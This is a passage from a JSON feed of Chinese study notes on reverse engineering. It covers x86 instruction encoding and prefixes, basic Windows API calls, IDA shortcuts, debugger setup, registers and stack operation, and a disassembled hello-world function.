ds:[0x59DB5],dl</p>\n<p>00A291D5    8810            mov byte ptr ds:[eax],dl</p>\n<p>mod 决定了后面的立即数是几位的</p>\n<p>opcode 决定了后面有没有 modrm</p>\n<p>modrm 决定了后面有没有 sib</p>\n<p>如果 rm 是 4，那么后面就有 1 字节的 sib，就是上图中带 [–][–] 的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230927205322395.png\" alt=\"image-20230927205322395\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230927205431293.png\" alt=\"image-20230927205431293\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230927222338794.png\" alt=\"image-20230927222338794\"></p>\n<p>88 84 48</p>\n<p>al 由 modrm 确定</p>\n<p>ds;[] 由 sib 确定</p>\n<p>mov byte ptr ds:[eax+ecx*2+0x78563412],al</p>\n<p>89 84 84 11111111</p>\n<p>mov dword ptr ss:[esp+eax*4 + 0x11111111],eax</p>\n<p>esp 或者 ebp 的时候是 ss:[]</p>\n<p>89 2C 15</p>\n<p>mod == 00 [*] 变成了 32 位偏移</p>\n<p>mov dword ptr ds:[edx+0x78563412]  ,ebp</p>\n<p>89 AC 15</p>\n<p>mod == 10</p>\n<p>mov dowrd ptr ds:[edx+ebp+0x12345678],ebp</p>\n<p>89 84 61</p>\n<p>sib 中 none 代表啥都不加</p>\n<p>mov dword ptr ds:[ecx],eax</p>\n<p>注意，他还是占 7 个字节</p>\n<p>00CA187D    898461 8BFF558B    mov dword ptr ds:[ecx+0x8B55FF8B],eax</p>\n<h4 id=\"modrm中-345-为-opcode情况\"><a class=\"markdownIt-Anchor\" href=\"#modrm中-345-为-opcode情况\">#</a> modrm 中 3,4,5 为 opcode 情况：</h4>\n<p>table A-2 是硬编码主表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">80 81 82 83 这几个编码，并没有明确给出具体的操作码是什么。\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">特别说明：凡是出现Grp的，均参见TableA-6\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">见到grp，那么modrm中 345为opcode</span><br><span class=\"line\"></span><br><span class=\"line\">举例说明：\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">80 65 08 FF\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">查表步骤：\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">1、第一个字节为80 查Table-2表，得到对应结构：Eb,Ib\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">2、第二个字节为ModR/M字段，所以查分65:\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">01 100 101\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">Mod 与 R/M字段 查Table2-2 得到对应的结构：[EBP+DIS8]\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">3、100 字段 查表TableA-6 得到对应操作码为：AND\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">4、最终的指令格式：\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">AND [ebp+dis8],Ib\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">AND BYTE PTR SS:[EBP+08],0xFF\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2021010923451763.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210109234736912.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210109234807101.png\" alt=\"img\"></p>\n<p>Table A-6</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230928161513596.png\" alt=\"image-20230928161513596\"></p>\n<p>rAX == RAX / EAX / AX</p>\n<p>eAX == AX / EAX</p>\n<p>指令长度最多 15 字节，opcode 可能是 1,2,3 字节</p>\n<p>table a-2 中只有 0F 是两字节，其余都是 1 字节，0F 查看 table A-3</p>\n<p>0F + table-A3 至少都是两字节</p>\n<p>0f 38  /  0f  3a  指令长度 3 字节，其余都是两字节 ，查看 table-A4 和 table-A5</p>\n<p>table A-3</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210109234843992.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2021010923491235.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210109234938426.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210109235007612.png\" alt=\"img\"></p>\n<h4 id=\"指令前缀\"><a class=\"markdownIt-Anchor\" href=\"#指令前缀\">#</a> 指令前缀</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230928164340783.png\" alt=\"image-20230928164340783\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、段前缀：\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">段寄存器的作用：早期8086cpu寻址范围小，Inter遍通过段寄存器来拓展内存.即通过段寄存器基址+偏移的方式来寻址。\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">[]中的地址为有效地址(Effect Address)，有效地址+段寄存器基址才是实际地址LA(线性地址 Line Address)。\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">线性地址 = 段基址 + 有效地址\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">在后来的80386时，cpu的寻址范围大大提升，这些段寄存器便被用作了其他用途。但是DS:[]类似\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">这种寻址格式却被保留了下来。\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">实际上操作码已经决定了寻址时使用哪个段寄存器作为基址，不需要其他字节描述。\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">1、如果没有特别说明，[]前为DS，即DS:[]\t</span><br><span class=\"line\">2、PUSH POP指令，以及在[]中使用ESP/EBP的，使用SS段\t</span><br><span class=\"line\">3、在[Base + Index*2Scale + I]中,以Base为判断条件，没有特别说明，用DS。如果Base为ESP/EBP，则用SS段.\t</span><br><span class=\"line\">4、串操作指令一般使用ES。MOV ES:[EDI] DS:[ESI]中，目标EDI使用ES段，其他使用DS段.\t</span><br><span class=\"line\">5、EIP指向当前指令，EIP取指令时使用的是CS段.\t</span><br><span class=\"line\">6、如果指令加段寄存器前缀，则该条指令一律用这个段，如果加多个段寄存器前缀，默认只看op前的那个.\t</span><br><span class=\"line\"></span><br><span class=\"line\">2、操作指令前缀\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">0x66 \t将操作数改为16字节。例子50为 PUSH EAX, 而66 50则为 PUSH AX</span><br><span class=\"line\">\t</span><br><span class=\"line\">004183DA      50                     PUSH EAX\t</span><br><span class=\"line\">004183DB      66:50                  PUSH AX\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">3、操作指令前缀：修改默认寻址方式\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">0x67 \t将操作数改为16字节。例子50为 PUSH EAX, 而66 50则为 PUSH AX</span><br><span class=\"line\">\t</span><br><span class=\"line\">004183FD      8801          MOV BYTE PTR DS:[ECX],AL\t</span><br><span class=\"line\">004183FF      67:8801       MOV BYTE PTR DS:[BX+DI],AL\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">指令前缀更多信息参见：35页\t</span><br><span class=\"line\"></span><br><span class=\"line\">4.锁前缀</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">指令前缀是互斥的，一共有四组</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MTIwMzYxL2FydGljbGUvZGV0YWlscy8xMTI0MTU2NTE=\">【2021.01.09】Intel Table_intel table a-1 表说明 - CSDN 博客</span></p>\n<h2 id=\"winapi\"><a class=\"markdownIt-Anchor\" href=\"#winapi\">#</a> winapi</h2>\n<h3 id=\"messageboxaw\"><a class=\"markdownIt-Anchor\" href=\"#messageboxaw\">#</a> MessageBoxA/W</h3>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">MessageBoxA</span>(</span><br><span class=\"line\">    _In_opt_ HWND hWnd,</span><br><span class=\"line\">    _In_opt_ LPCSTR lpText,</span><br><span class=\"line\">    _In_opt_ LPCSTR lpCaption,</span><br><span class=\"line\">    _In_ UINT uType);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">MessageBox</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);       <span class=\"comment\">//错误</span></span><br><span class=\"line\"><span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;选择进程&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;出错啦&quot;</span>),MB_OK);  <span class=\"comment\">// 出错啦是标题，选择进程是弹窗内容</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"createthread\"><a class=\"markdownIt-Anchor\" href=\"#createthread\">#</a> CreateThread</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HANDLE hThread = ::CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);\t</span><br><span class=\"line\"></span><br><span class=\"line\">ThreadProc 是回调函数</span><br><span class=\"line\">DWORD WINAPI ThreadProc(LPVOID lpParameter)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"suspendthread\"><a class=\"markdownIt-Anchor\" href=\"#suspendthread\">#</a> SuspendThread</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//挂起线程</span></span><br><span class=\"line\">::SuspendThread(hThread);\t\t</span><br></pre></td></tr></table></figure>\n<h3 id=\"resumethread\"><a class=\"markdownIt-Anchor\" href=\"#resumethread\">#</a> ResumeThread</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//恢复线程</span><br><span class=\"line\">::ResumeThread(hThread);\t\t</span><br></pre></td></tr></table></figure>\n<h3 id=\"getdlgitem\"><a class=\"markdownIt-Anchor\" href=\"#getdlgitem\">#</a> GetDlgItem</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//获取页面空间</span></span><br><span class=\"line\">HWND hEdit = GetDlgItem(hDlg,IDC_EDIT);</span><br></pre></td></tr></table></figure>\n<h3 id=\"setwindowtext\"><a class=\"markdownIt-Anchor\" href=\"#setwindowtext\">#</a> SetWindowText</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetWindowText(hEdit,<span class=\"string\">&quot;1000&quot;</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"getwindowtext\"><a class=\"markdownIt-Anchor\" href=\"#getwindowtext\">#</a> GetWindowText</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TCHAR szBuffer[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"built_in\">memset</span>();</span><br><span class=\"line\">GetWindowText(句柄,数据缓冲区,长度);\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"sscanf\"><a class=\"markdownIt-Anchor\" href=\"#sscanf\">#</a> sscanf</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//字符串转整数</span></span><br><span class=\"line\"><span class=\"built_in\">sscanf</span>( szBuffer, <span class=\"string\">&quot;%d&quot;</span>, &amp;dwTimer );\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"sprintf\"><a class=\"markdownIt-Anchor\" href=\"#sprintf\">#</a> sprintf</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//数字转字符串</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(szBuffer);</span><br><span class=\"line\"><span class=\"built_in\">sprintf</span>(数据缓冲区,<span class=\"string\">&quot;%d&quot;</span>,数字);\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> IDA</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IDA 创建工程时会一起创建四个文件</span><br><span class=\"line\">后缀分别为 id0 id1 nam  til</span><br><span class=\"line\"></span><br><span class=\"line\">关闭ida时可以选择不同存储方式</span><br><span class=\"line\">dont pack 会保持四个文件</span><br><span class=\"line\">store后会生成一个idb文件，下次直接打开idb文件</span><br><span class=\"line\"></span><br><span class=\"line\">collect grabage  清理内存</span><br><span class=\"line\"></span><br><span class=\"line\">dont save 回退到打开前版本</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">空格切换视图 流程图 / 反汇编代码</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A  字符串显示数据</span><br><span class=\"line\">D  数据显示  dd word   ddd dword</span><br><span class=\"line\">C  指令显示  </span><br><span class=\"line\">U  undefined</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">G 跳转</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ALT + T  搜索</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n  改名</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">新增结构体  edit 添加结构体类型</span><br><span class=\"line\">d 结构体中新增成员 d dd ddd</span><br><span class=\"line\">n改名</span><br><span class=\"line\">ALT+Q 添加结构体变量，改变结构体</span><br><span class=\"line\">右键 添加数组</span><br><span class=\"line\">t  选择结构体</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;</span><br><span class=\"line\">:</span><br><span class=\"line\">函数 + ;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cross_reference  交叉引用</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230910212324077.png\" alt=\"image-20230910212324077\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2、配置双机调试流程</span><br><span class=\"line\">1)在本机安装Windbg(WDK 7600)</span><br><span class=\"line\">2)在虚拟机中(XP)修改boot.ini设置虚拟机</span><br><span class=\"line\">4)修改Windbg运行参数指向虚拟机</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230910213126254.png\" alt=\"image-20230910213126254\"></p>\n",
            "tags": [
                "逆向"
            ]
        },
        {
            "id": "http://example.com/2022/11/11/reverse/",
            "url": "http://example.com/2022/11/11/reverse/",
            "title": "逆向",
            "date_published": "2022-11-11T05:38:45.000Z",
            "content_html": "<h2 id=\"c与汇编的关系\"><a class=\"markdownIt-Anchor\" href=\"#c与汇编的关系\">#</a> C 与汇编的关系</h2>\n<h3 id=\"应用层技术栈\"><a class=\"markdownIt-Anchor\" href=\"#应用层技术栈\">#</a> 应用层技术栈：</h3>\n<ol>\n<li>加密与解密（四）看雪论坛</li>\n<li>X86/X64/arm 汇编语言</li>\n<li>windows 核心编程</li>\n<li>c 语言从入门到精通 (第三版) （清华）</li>\n</ol>\n<h3 id=\"学习逆向环境配置\"><a class=\"markdownIt-Anchor\" href=\"#学习逆向环境配置\">#</a> 学习逆向环境配置</h3>\n<p>工具类：</p>\n<ul>\n<li>吾爱破解工具类</li>\n<li>Hxd (十六进制编辑工具)</li>\n</ul>\n<p>开发类：</p>\n<ol>\n<li>VS2008 IDE</li>\n<li>VC6.0 SP6 IDE</li>\n</ol>\n<h3 id=\"进制转换\"><a class=\"markdownIt-Anchor\" href=\"#进制转换\">#</a> 进制转换</h3>\n<ol>\n<li>十进制的定义：由十个符号组成，分别是 0 1 2 3 4 5 6 7 8 9 逢十进一</li>\n<li>九进制的定义：由九个符号组成，分别是 0 1 2 3 4 5 6 7 8 逢九进一</li>\n<li>十六进制的定义：由十六个符号组成，分别是 0 1 2 3 4 5 6 7 8 9 A B C D E F</li>\n<li>N 进制的定义：由 N 个符号组成 逢 N 进一</li>\n</ol>\n<h3 id=\"数据类型与逻辑运算\"><a class=\"markdownIt-Anchor\" href=\"#数据类型与逻辑运算\">#</a> 数据类型与逻辑运算</h3>\n<p>在计算机中，由于硬件的制约，数据是有长度限制的，超过数据宽度的数据会被丢弃</p>\n<p>同一个数据，表示无符号数和有符号数则其含义不同</p>\n<ol>\n<li>无符号数：正数</li>\n<li>有符号数：正数、负数</li>\n</ol>\n<h3 id=\"常见的数据类型重要\"><a class=\"markdownIt-Anchor\" href=\"#常见的数据类型重要\">#</a> 常见的数据类型（重要）</h3>\n<ul>\n<li>BYTE                    字节          8BIT</li>\n<li>WORD                 字             16BIT 2 字节</li>\n<li>DWORD              双字          32BIT 4 字节</li>\n</ul>\n<h3 id=\"常见的运算符类型重要\"><a class=\"markdownIt-Anchor\" href=\"#常见的运算符类型重要\">#</a> <strong>常见的运算符类型（重要）</strong></h3>\n<p><strong>或运算（or |）</strong></p>\n<p>只要有一个为 1 则结果为 1</p>\n<p><strong>与运算（and &amp;）</strong></p>\n<p>两个都是 1 结果才为 1</p>\n<p><strong>异或运算（xor ^）</strong></p>\n<p>相同为 0 不同为 1</p>\n<p><strong>非运算 (not !)</strong></p>\n<p>取反 1 是 0 0 是 1</p>\n<h3 id=\"32位寄存器\"><a class=\"markdownIt-Anchor\" href=\"#32位寄存器\">#</a> 32 位寄存器</h3>\n<p>EAX</p>\n<p>EBX</p>\n<p>ECX</p>\n<p>EDX</p>\n<p>只有通用寄存器能拆成高位和低位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov byte [local.3+2],ah     //由于只是高位地址，因此是3+2</span><br><span class=\"line\">mov byte [local.3+3],ah     //同时注意是byte，所以是2</span><br></pre></td></tr></table></figure>\n<p>command 中</p>\n<p>?al 可以显示 al 中的值，即查看寄存器中的值</p>\n<p>dd  内存 display dword</p>\n<p>dw 内存</p>\n<p>db 内存</p>\n<h3 id=\"cpu计算23\"><a class=\"markdownIt-Anchor\" href=\"#cpu计算23\">#</a> CPU 计算 2+3</h3>\n<p>1. 先异或，得到 R</p>\n<p>2. 在与运算，将结果左移一位</p>\n<p>3. 如果 (2) 的结果为全 0，那么 R 就是最终答案，如果不是，将 R 赋值给 x，将 (2) 的结果赋值给 y</p>\n<p>4. 重复操作直至 (2) 的结果为全 0，那么此时 R 就是我们的答案</p>\n<h3 id=\"cpu计算2-3\"><a class=\"markdownIt-Anchor\" href=\"#cpu计算2-3\">#</a> CPU 计算 2-3</h3>\n<p>1. 异或，得到 R</p>\n<p>2. 在与运算，将结果再左移一位</p>\n<p>3. 如果结果为全 0，那么 R 就是结果，否则重复</p>\n<p>在 debug 的模式下是用常量来分配的 print hello world</p>\n<h3 id=\"堆栈的原理\"><a class=\"markdownIt-Anchor\" href=\"#堆栈的原理\">#</a> 堆栈的原理：</h3>\n<ol>\n<li>临时存放一些寄存器已无法存放的数据，比如超过内存对齐的数据类型</li>\n<li>存放临时数据，野指针，指针初始化时的数据</li>\n</ol>\n<p>Windows 分配栈时 是从高地址往低地址分配:</p>\n<ol>\n<li>MOV EBX,0x13FFDC        BASE</li>\n<li>MOV EDX,0x13FFDC        TOP</li>\n</ol>\n<p>EBP 和 ESP：</p>\n<p>ESP：该指针永远指向系统栈最上面一个栈帧的栈顶。</p>\n<p>EBP：该指针永远指向系统栈最上面一个栈帧的底部。</p>\n<p>栈底和栈顶原理：</p>\n<ol>\n<li>控制栈顶和栈底分别为两个固定的寄存器 (EBP 基址指针寄存器 和 ESP 堆栈指针寄存器）</li>\n</ol>\n<p>ebp = esp</p>\n<p>esp -= 0x40</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654236227177-d37c824f-e09f-4e3d-9a41-c4d81ee6de30.png\" alt=\"img\"></p>\n<p>ESP 和 EBP 不够的时候会相互借用，两个都用作传参</p>\n<p>初始状态下，ebp 指向高地址，ESP 指向低地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105095016154.png\" alt=\"image-20221105095016154\"></p>\n<p>push eax</p>\n<blockquote>\n<p>先把 esp-4，再把 eax 中的值压栈</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105095049237.png\" alt=\"image-20221105095049237\"></p>\n<p>pop eax</p>\n<blockquote>\n<p>将 esp 指向的值给 eax，esp+4</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105095144317.png\" alt=\"image-20221105095144317\"></p>\n<h4 id=\"一个helloworld的main函数\"><a class=\"markdownIt-Anchor\" href=\"#一个helloworld的main函数\">#</a> 一个 helloworld 的 main 函数</h4>\n<p>一般来说，VC 6.0 的 main 函数在  <code>call 00401005</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105093859109.png\" alt=\"image-20221105093859109\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401005  /$ /E9 06000000   jmp     main</span><br><span class=\"line\">0040100A  |  |CC            int3</span><br><span class=\"line\">0040100B  |  |CC            int3</span><br><span class=\"line\">0040100C  |  |CC            int3</span><br><span class=\"line\">0040100D  |  |CC            int3</span><br><span class=\"line\">0040100E  |  |CC            int3</span><br><span class=\"line\">0040100F  |  |CC            int3</span><br><span class=\"line\">00401010 &gt;|&gt; \\55            push    ebp</span><br><span class=\"line\">00401011  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401013  |.  83EC 40       sub     esp,0x40</span><br><span class=\"line\">00401016  |.  53            push    ebx</span><br><span class=\"line\">00401017  |.  56            push    esi</span><br><span class=\"line\">00401018  |.  57            push    edi</span><br><span class=\"line\">00401019  |.  8D7D C0       lea     edi,[local.16]</span><br><span class=\"line\">0040101C  |.  B9 10000000   mov     ecx,0x10</span><br><span class=\"line\">00401021  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401026  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401028  |.  68 1C204200   push    0042201C                         ; /format = &quot;Hello World!</span><br><span class=\"line\">&quot;</span><br><span class=\"line\">0040102D  |.  E8 2E000000   call    printf                           ; \\printf</span><br><span class=\"line\">00401032  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00401035  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00401037  |.  5F        